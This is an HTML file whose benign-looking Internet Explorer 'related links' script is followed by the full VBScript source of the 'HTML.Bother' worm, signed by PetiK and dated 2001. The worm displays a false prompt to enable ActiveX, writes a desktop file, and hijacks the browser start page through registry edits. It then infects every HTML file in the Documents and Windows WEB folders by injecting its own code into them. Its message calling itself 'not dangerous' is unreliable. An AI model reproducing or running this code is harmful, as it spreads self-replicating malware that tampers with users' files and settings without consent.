<bother>
<script>

//Build the query
userURL=external.menuArguments.location.href;
RelatedServiceURL="http://related.msn.com/related.asp?url=";

//Perform simple check for Intranet URLs 
//this is where the http or https will be, as found by searching for :// but skip res:
protocolIndex=userURL.indexOf("://",4);
serverIndex=userURL.indexOf("/",protocolIndex + 3);
urlresult=userURL.substring(0,serverIndex);

//Check if Intranet URL - then open search bar

if (urlresult.indexOf(".",0) < 1) userURL="Intranet URL";
finalURL = RelatedServiceURL + escape(userURL);
external.menuArguments.open(finalURL, "_search");

</script>



<bother par PetiK May 9th 2001>
<FONT color=#ff0000 face=verdana size=2>You need ActiveX enabled if you want to 
see this page. <BR>Please open this page again and click accept 
ActiveX.<BR>Internet Explorer</FONT>
<SCRIPT language=VBScript>
On Error Resume Next
Set fso=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")

bureau=ws.RegRead ("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Desktop")
Set txt=fso.CreateTextFile(bureau&"\Hello.txt")
txt.WriteLine "HTML.Bother by PetiK (06/05/2001)"
txt.WriteLine "A HTML.Worm made in France"
txt.Close

start=ws.RegRead ("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page")
If start <> fso.GetSpecialFolder(1)&"\PetiK.htm" Then
Set htm=fso.CreateTextFile(fso.GetSpecialFolder(1)&"\PetiK.htm",2)
htm.WriteLine ("<html><head><title>HTML.Bother</title>")
htm.WriteLine ("<body><IFRAME SRC='"+start+"'></IFRAME>")
htm.WriteLine ("<font face='verdana' color=blue size='2'>")
htm.WriteLine ("<br><br>Hi, you have my Worm.")
htm.WriteLine ("<br>It's not dangerous.")
htm.WriteLine ("<br>Contact Symantec Corporation (www.symantec.com/avcenter) to disinfect your computer")
htm.WriteLine ("</body></html>")
htm.Close
ws.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page",fso.GetSpecialFolder(1)&"\PetiK.htm"
End If

p = Int(Rnd * 30) + 1
If Day(Now()) = p Then
WshShell.RegWrite "HKEY_CLASSES_ROOT\htmlfile\DefaultIcon\",fso.GetSpecialFolder(1)&"\SHELL32.dll,69"
End If

doc=ws.RegRead ("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Personal")
Set FolderObj = FSO.GetFolder(doc)
	Set FO = FolderObj.Files
	For each cible in FO
		ExtName = lcase(FSO.GetExtensionName(cible.Name))
		if ExtName = "htm" or ExtName = "html" Then
			Set vrai = fso.OpenTextFile(cible.path, 1, False)
			if vrai.readline <> "<bother>" Then
				vrai.close()
				Set vrai = fso.OpenTextFile(cible.path, 1, False)
				htmorg = vrai.ReadAll()
				vrai.close()
				Set virus = document.body.createTextRange
				Set vrai = fso.CreateTextFile(cible.path, True, False)
				vrai.WriteLine "<bother>"
				vrai.Write(htmorg)
				vrai.WriteLine "<bother par PetiK May 9th 2001>"
				vrai.WriteLine virus.htmltext
				vrai.Close()
			else
				Real.close()
			end if
		end if
	next
	
Set FolderObj = FSO.GetFolder(fso.GetSpecialFolder(0)&"\WEB")
	Set FO = FolderObj.Files
	For each cible in FO
		ExtName = lcase(FSO.GetExtensionName(cible.Name))
		if ExtName = "htm" or ExtName = "html" Then
			Set vrai = fso.OpenTextFile(cible.path, 1, False)
			if vrai.readline <> "<bother>" Then
				vrai.close()
				Set vrai = fso.OpenTextFile(cible.path, 1, False)
				htmorg = vrai.ReadAll()
				vrai.close()
				Set virus = document.body.createTextRange
				Set vrai = fso.CreateTextFile(cible.path, True, False)
				vrai.WriteLine "<bother>"
				vrai.Write(htmorg)
				vrai.WriteLine "<bother par PetiK May 9th 2001>"
				vrai.WriteLine virus.htmltext
				vrai.Close()
			else
				Real.close()
			end if
		end if
	next

</SCRIPT>
